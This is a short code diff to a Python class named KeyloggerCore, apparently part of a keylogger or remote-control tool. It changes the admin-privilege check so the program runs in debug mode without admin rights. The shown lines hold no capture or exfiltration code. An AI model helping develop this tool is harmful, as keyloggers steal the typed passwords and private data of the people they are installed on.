@@ -33,12 +33,14 @@ else:
 
 class KeyloggerCore:
     def __init__(self):
-        # Check admin privileges
-        if not ctypes.windll.shell32.IsUserAnAdmin():
-            if Config.DEBUG_MODE:
+        # Check admin privileges only in non-debug mode
+        if not Config.DEBUG_MODE and not ctypes.windll.shell32.IsUserAnAdmin():
+            if Config.DEBUG_MODE:  # This won't run, but kept for consistency
                 logging.error("This program requires administrative privileges.")
             sys.exit(1)
-            
+        elif Config.DEBUG_MODE and not ctypes.windll.shell32.IsUserAnAdmin():
+            logging.warning("Running in debug mode without admin privileges. Some commands may fail.")
+
         self.client_id = Config.get_client_id()
         if Config.DEBUG_MODE:
             logging.info(f"Client ID: {self.client_id}")
